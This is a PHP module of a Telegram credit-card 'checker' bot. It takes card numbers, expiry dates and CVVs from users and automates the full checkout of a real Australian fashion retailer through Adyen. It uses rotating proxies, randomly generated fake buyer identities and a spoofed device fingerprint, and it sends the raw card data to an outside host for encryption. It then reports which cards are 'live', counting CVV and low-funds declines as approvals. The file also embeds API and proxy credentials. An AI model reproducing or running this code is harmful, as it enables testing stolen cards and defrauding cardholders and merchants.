<?php
list($cmd) = explode(" ", $message);
if($cmd == "/st" or $cmd == ".st" or $cmd == "!st"){    
    $tiempo_inicial = microtime(true);
    is_credits();
    $NameGater ='Stranger';
$gateway = '/st :'.$NameGater;
Contador($gateway);
    deleteprm($userId);
    Dcred($userId);
    deltecred($userId);
    $Mi_Id = "5168647868";
    $lista = substr($message, 3);
    if (empty($lista)){
        reply_to($chatId, $message_id,$keyboard,'<b>Stranger%0AFormat: cc|m|y|cvv</b>');
        die();
    }
    $bin = substr($lista, 0,6);
    $bines = bannedbin($bin);
        if($bines == true){
            reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
            exit();
        }
$input ='Stranger';
is_gateroff($input);
if($userId == verifniBan($userId)){
    sendMessage($chatId,$keyboard,"<b>🚷- [Status Ban] Te Encuentra ban no puedes hacer uso de ningún comando del bot%0AID : $userId</b>.");
    die();
}


$nui = infouser($userId);
    $Rank = $nui['apodo'];
if($gId == $Mi_Id){
    $Rank = "Owner";
    $GLOBALS['Rank'] = $Rank;
}elseif($userId == verifiAdmin($userId)){
    $Rank ="Admin";
    $GLOBALS['Rank'] = $Rank;
}elseif($userId == veritimepremium($userId)){
   $Rank = $nui['apodo'];
}elseif($chatId == verifiCharAdmin($chatId)){
    $Rank = "Free User";
    $GLOBALS['Rank'] = $Rank;
}
elseif($userId == verifiUser($userId)){
    $Rank ="Free user";
    $GLOBALS['Rank'] =$Rank;
}


$lista = clean($lista);
$check = strlen($lista);
$chem = substr($lista, 0,1);
if(preg_match_all("/(\d{15,16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3,4})/", $lista, $matches)) {
    $lista = $matches[0][0]; 
$ccs = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
$strlenn = strlen($cc);
$strlen1 = strlen($mes);
$ano1 = $ano;

$c1 = substr($ccs, 0, 4); 
$c2 = substr($ccs, 4, 4); 
$c3 = substr($ccs, 8, 4); 
$c4 = substr($ccs, -4);

$cc = "$c1 $c2 $c3 $c4";
$list = preg_replace(''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
$vaut = array(1,2,7,8,9,0);
if (in_array($chem, $vaut)) { 
    reply_to($chatId, $message_id,$keyboard,'<b>Este bot solo soporta Amex, Visa, MasterCard y Discover.</b>');
    exit();
  }
$antispmatim = antispamCheck($userId);
    if($antispmatim != False ){
       reply_to($chatId,$message_id,$keyboard,"<b>[ANTI SPAM] Try again after $antispmatim</b><b>s</b>.");
        exit();
    }
$antispmatim = antispamCheckperemium($userId);
    if($antispmatim != False ){
       reply_to($chatId,$message_id,$keyboard,"<b>[ANTI SPAM] Try again after $antispmatim</b><b>s</b>.");
        exit();
    }
antispFree($gId);
$cc3 = substr($ccs, 0,6);
$res = bininfo($cc3);
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];


$ccincore = Luhn($cc);
if($ccincore == 'ERROR'){
    reply_to($chatId,$message_id,$keyboard,"<b>Incorrect Credit Card Number</b>");
    die();
}
$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
    'disable_web_page_preview' => true,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Braintree
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>"
]);
$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
sendaction($chatId, typing);



if(strlen($ano) == 2 ){
  $ano = "20".$ano;
}

if(strlen($mes) == 1){
    $mes = "0".$mes;
  }





$solver = new \Capsolver\CapsolverClient('CAP-5361C0C774F336BECC410D69E869566E');

$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"])  . strtolower($user["name"]["last"]) .rand(111,23343). '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];

$zip = $user["location"]["postcode"];

$areaCode = rand(201, 999);
$centralOfficeCode = rand(100, 999);
$lineNumber = rand(1000, 9999);

$phone = $areaCode . $centralOfficeCode . $lineNumber;
$password = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 12);

$stateAb = [
    "Alabama" => "AL",
    "Alaska" => "AK",
    "Arizona" => "AZ",
    "Arkansas" => "AR",
    "California" => "CA",
    "Colorado" => "CO",
    "Connecticut" => "CT",
    "Delaware" => "DE",
    "District of Columbia" => "DC",
    "Florida" => "FL",
    "Georgia" => "GA",
    "Hawaii" => "HI",
    "Idaho" => "ID",
    "Illinois" => "IL",
    "Indiana" => "IN",
    "Iowa" => "IA",
    "Kansas" => "KS",
    "Kentucky" => "KY",
    "Louisiana" => "LA",
    "Maine" => "ME",
    "Maryland" => "MD",
    "Massachusetts" => "MA",
    "Michigan" => "MI",
    "Minnesota" => "MN",
    "Mississippi" => "MS",
    "Missouri" => "MO",
    "Montana" => "MT",
    "Nebraska" => "NE",
    "Nevada" => "NV",
    "New Hampshire" => "NH",
    "New Jersey" => "NJ",
    "New Mexico" => "NM",
    "New York" => "NY",
    "North Carolina" => "NC",
    "North Dakota" => "ND",
    "Ohio" => "OH",
    "Oklahoma" => "OK",
    "Oregon" => "OR",
    "Pennsylvania" => "PA",
    "Rhode Island" => "RI",
    "South Carolina" => "SC",
    "South Dakota" => "SD",
    "Tennessee" => "TN",
    "Texas" => "TX",
    "Utah" => "UT",
    "Vermont" => "VT",
    "Virginia" => "VA",
    "Washington" => "WA",
    "West Virginia" => "WV",
    "Wisconsin" => "WI",
    "Wyoming" => "WY",
];
$regioncode = $stateAb["$state"];


$cookies = tempnam(sys_get_temp_dir(), 'cookie');


$user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU iPadOS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
  ];
  
$ua = $user_agents[array_rand($user_agents)];


$curl = new CurlX;





$maxRetries = 3; // número máximo de intentos
$retries = 0; // contador de intentos

$socks5 = "all.dc.smartproxy.com:10000";
$rotate = "Testingthis123:Testingpassword12+";




while ($retries < $maxRetries) {
    try { 
        $cookie = uniqid();

        $server = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];

        $request = $curl::Get('https://httpbin.org/ip', NULL, NULL, $server);
        
        $ip = ($curl::ParseString($request->body, '"origin": "', '"'));

        $riskData = (base64_encode('{"version":"1.0.0","deviceFingerprint":"DpqwU4zEdN00500000000000002J38D55uSG0025537800cVB94iKzBGeNVfrSmYkdBix7RX3az8002AfeJfGFBhb00000qZkTE00000NZgkEjMcmY8bcIu6FDHO:40","persistentCookie":[],"components":{"userAgent":"45eab6b7da6455944cef26a1d325577c","webdriver":0,"language":"es-419","colorDepth":24,"deviceMemory":8,"pixelRatio":1,"hardwareConcurrency":8,"screenWidth":768,"screenHeight":1366,"availableScreenWidth":768,"availableScreenHeight":1366,"timezoneOffset":300,"timezone":"America/Guayaquil","sessionStorage":1,"localStorage":1,"indexedDb":1,"addBehavior":0,"openDatabase":0,"platform":"Win32","plugins":"29cf71e3d81d74d43a5b0eb79405ba87","canvas":"98e03f5e55b57089939400e3559b96d0","webgl":"b2fcac12dd9f253d7f270f44d0c16fec","webglVendorAndRenderer":"Google Inc. (Intel)~ANGLE (Intel, Intel(R) UHD Graphics (0x00008A56) Direct3D11 vs_5_0 ps_5_0, D3D11)","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":0,"hasLiedBrowser":0,"fonts":"41c37ee7a27152ed8fa4b3e6f2348b1b","audio":"902f0fe98719b779ea37f27528dfb0aa","enumerateDevices":"5f3fdaf4743eaa707ca6b7da65603892","ip":"'.$ip.'"}}'));

        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'referer: https://www.forevernew.com.au/womens-dresses',
            'upgrade-insecure-requests: 1',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0'
        ];
        $request = $curl::Get('https://www.forevernew.com.au/florence-rib-detail-midi-dress-288740?colour=porcelain', $headers, $cookie, $server);
        if (!$request->success) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }
        $url = ($curl::ParseString($request->body, 'action="https://www.forevernew.com.au/checkout/cart/add/uenc/', '"'));

        $form_key = ($curl::ParseString($request->body, '<input name="form_key" type="hidden" value="', '"'));


        $headers = [
            'accept: application/json, text/javascript, */*; q=0.01',
            'content-type: application/x-www-form-urlencoded',
            'cookie: form_key='.$form_key.'',
            'origin: https://www.forevernew.com.au',
            'referer: https://www.forevernew.com.au/florence-rib-detail-midi-dress-288740?colour=porcelain',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0',
            'x-newrelic-id: VQECWVZSCxAHUVZRAQYPVw==',
            'x-requested-with: XMLHttpRequest'
        ];

        $data = [
            'product' => 702532,
            'selected_configurable_option' => '',
            'related_product' => '',
            'item' => 702532,
            'form_key' => $form_key,
            'super_attribute' => [
                960 => 3255,
                801 => 180
            ],
            'qty' => 1
        ];
        $request = $curl::Post('https://www.forevernew.com.au/checkout/cart/add/uenc/'.$url.'', http_build_query($data), $headers, $cookie, $server);
        if (!$request->success) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }
        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language: es-419,es;q=0.9',
            'referer: https://www.forevernew.com.au/florence-rib-detail-midi-dress-288740?colour=porcelain',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0'
        ];
        $request = $curl::Get('https://www.forevernew.com.au/checkout/', $headers, $cookie, $server);
        if (!$request->success) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }
        echo $entity_id = ($curl::ParseString($request->body, '"entity_id":"', '"'));
        if ($entity_id == 'null') {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }
        $headers = [
            'accept: application/json, text/plain, */*',
            'accept-language: es-419,es;q=0.9',
            'content-type: application/json',
            'origin: https://www.forevernew.com.au',
            'referer: https://www.forevernew.com.au/checkout/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0',
            'x-newrelic-id: VQECWVZSCxAHUVZRAQYPVw==',
            'x-requested-with: XMLHttpRequest'
        ];
        $data = '{"address":{"country_id":"AU","postcode":"2158","region":"NSW"}}';
        $request = $curl::Post('https://www.forevernew.com.au/rest/fn_au_en/V1/guest-carts/'.$entity_id.'/estimate-shipping-methods', $data, $headers, $cookie, $server);
        if (!$request->success) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }
        $carrier_code = ($curl::ParseString($request->body, '"carrier_code":"', '"'));
        $method_code = ($curl::ParseString($request->body, '"method_code":"', '"'));
        if ($carrier_code == 'null') {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }

        $headers = [
            'accept: application/json, text/plain, */*',
            'accept-language: es-419,es;q=0.9',
            'content-type: application/json',
            'origin: https://www.forevernew.com.au',
            'referer: https://www.forevernew.com.au/checkout/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0',
            'x-newrelic-id: VQECWVZSCxAHUVZRAQYPVw==',
            'x-requested-with: XMLHttpRequest'
        ];
        $data = '{"address_information":{"shipping_address":{"city":"MIDDLE DURAL","company":"","countryId":"AU","extensionAttributes":{"atl_signature":"false","atl_instructions":""},"firstname":"Amelia","lastname":"Barrows","email":"'.$email.'","postcode":"2158","region":"NSW","saveInAddressBook":null,"street":["758 Old Northern Rd"],"telephone":"9013164000"},"billing_address":{"city":"MIDDLE DURAL","company":"","countryId":"AU","extensionAttributes":{"atl_signature":"false","atl_instructions":""},"firstname":"Amelia","lastname":"Barrows","email":"'.$email.'","postcode":"2158","region":"NSW","saveInAddressBook":null,"street":["758 Old Northern Rd"],"telephone":"9013164000"},"shipping_method_code":"'.$carrier_code.'","shipping_carrier_code":"'.$method_code.'"}}';
        $request = $curl::Post('https://www.forevernew.com.au/rest/fn_au_en/V1/guest-carts/'.$entity_id.'/shipping-information', $data, $headers, $cookie, $server);
        if (!$request->success) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }

        $headers = [
            'accept: application/json, text/plain, */*',
            'accept-language: es-419,es;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://www.forevernew.com.au',
            'referer: https://www.forevernew.com.au/checkout/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0',
            'x-newrelic-id: VQECWVZSCxAHUVZRAQYPVw==',
            'x-requested-with: XMLHttpRequest'
        ];
        $data = [
            'quote_id' => $entity_id,
            'form_key' => $form_key
        ];
        $request = $curl::Post('https://www.forevernew.com.au/forevernew_adyen/payment/session/', http_build_query($data), $headers, $cookie, $server);
        if (!$request->success) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }
        $paymentSession = ($curl::ParseString($request->body, '"paymentSession":"', '"'));
        $quotePaymentToken = ($curl::ParseString($request->body, '"quotePaymentToken":"', '"'));
        if ($paymentSession == 'null') {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }

        $headers = [
            'accept: application/json, text/plain, */*',
            'accept-language: es-419,es;q=0.9',
            'content-type: application/json',
            'origin: https://www.forevernew.com.au',
            'referer: https://www.forevernew.com.au/checkout/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0',
            'x-newrelic-id: VQECWVZSCxAHUVZRAQYPVw==',
            'x-requested-with: XMLHttpRequest'
        ];
        $data = '{"email":"'.$email.'","billing_address":{"city":"MIDDLE DURAL","company":"","extensionAttributes":{"atl_signature":"false","atl_instructions":""},"firstname":"Amelia","lastname":"Barrows","email":"'.$email.'","postcode":"2158","region":"NSW","saveInAddressBook":null,"street":["758 Old Northern Rd"],"telephone":"9013164000"},"payment_method":{"additional_data":{"payment_session":"'.$paymentSession.'","quote_payment_token":"'.$quotePaymentToken.'"},"method":"adyen_cc","po_number":null}}';
        $request = $curl::Post('https://www.forevernew.com.au/rest/fn_au_en/V1/guest-carts/'.$entity_id.'/validate-quote', $data, $headers, $cookie, $server);
        if (!$request->success) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }
        $headers = [
            'accept: application/json, text/plain, */*',
            'accept-language: es-419,es;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://www.forevernew.com.au',
            'referer: https://www.forevernew.com.au/checkout/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0',
            'x-newrelic-id: VQECWVZSCxAHUVZRAQYPVw==',
            'x-requested-with: XMLHttpRequest'
        ];
        $option = [
            '5' => 'mastercard',
            '4' => 'visa',
            '3' => 'amex',
            '6' => 'discover',
        
        ];
        $branddd = urlencode($option[substr($ccs ,0,1)]);
        
        
        $request = $curl::Get('https://arturo.alwaysdata.net/adyen/adyen/adyen.php?lista='.$ccs.'|'.$mes.'|'.$ano.'|'.$cvv.'&key=10001|B345AB80977C3D8A38FBCFE8561EBCB931B277A620BBFF9141FF37844B55A561FB72E49BEC38B4E28C28C37EEE319B6FEBBA7A51E1F91FC54BD3A6C8885F330AC1CD78492E2FA56007BE4247B36A1D1C8D1F311FCAB47FE55C9F7ECA33F49C8F558EF7AA863221A39C166E7B9B10DA047D4668BA94481C5AFABC1E5572AC98D3305B1717BC7B32FD9C0C8B1BE2AAFF10DF6ACC9D614FBDC29023FC5A2CC58326B163B19CB1BA5A98B428F0C0E156982DCC9B3C7E5236A1A00FC073AD8520FB0765CB3F58CED9B4299EA47B4FA16693551FDDE4946667253EF070069E088DD258300C2D28A17DF7D0A4357BA2A28C226CEA400C15E77137E8AC45A8A16C637209', NULL, NULL, $server);
        if (!$request->success) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }
        $encryptedCardNumber = $curl::ParseString($request->body,'"cc":"', '"');
        $encryptedExpiryMonth = $curl::ParseString($request->body,'"mm":"', '"');
        $encryptedExpiryYear = $curl::ParseString($request->body,'"yy":"', '"');
        $encryptedSecurityCode = $curl::ParseString($request->body,'"cvc":"', '"');



        $data = [ 
            "stateData"=> '{"riskData":{"clientData":"'.$riskData.'"},"paymentMethod":{"type":"scheme","holderName":"'.$firstname.' '.$lastname.'","encryptedCardNumber":"'.$encryptedCardNumber.'","encryptedExpiryMonth":"'.$encryptedExpiryMonth.'","encryptedExpiryYear":"'.$encryptedExpiryYear.'","encryptedSecurityCode":"'.$encryptedSecurityCode.'","brand":"'.$branddd.'"},"browserInfo":{"acceptHeader":"*/*","colorDepth":24,"language":"es-419","javaEnabled":false,"screenHeight":768,"screenWidth":1366,"userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0","timeZoneOffset":300},"origin":"https://www.forevernew.com.au","clientStateDataIndicator":true}',
            'quote_id'=> $entity_id,
            'form_key'=> $form_key
            ];
        $request = $curl::Post('https://www.forevernew.com.au/forevernew_adyen/payment/handleauthorisation/', http_build_query($data), $headers, $cookie, $server);
        if (!$request->success) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }
        break; 
    } catch (Exception $e) {
        $retries++;
        if ($retries >= $maxRetries) {
            
            $text = Textretries();
         bot('editMessageText', ['chat_id'=>$chatId, 'message_id'=>$messageidtoedit, 'text'=>$text, 'parse_mode'=>'html', 'reply_to_message_id'=> $message_id]);
         return;
        }
    }
}

$message = ($curl::ParseString($request->body, '"message":"', '"'));

$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);

bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Braintree
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ALMOST FINISHED 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
antisppre($gId);


if(substr_count($request->body, 'CVV2 Declined')){
$status = "APPROVED ✅ ";
$response = "CVV2 Declined";
}elseif(substr_count($request->body, 'Not sufficient funds')){
$status = "APPROVED ✅#Lowfunds";
$response = "Not sufficient funds ✅";
}elseif(substr_count($request->body, '"success":true')){
$status = "APPROVED ✅ ";
$response = "APPROVED";
}else{
$status = "DECLINED #DEAD ❌";
$response = $message;
}
bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Braintree
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>$status</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Response: <code>$response</code>
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);

$free = antispFree($gId);
$premi = antisppre($gId);
unlink(getcwd().'/cookie/'.$Idcooki.'.txt');
}}



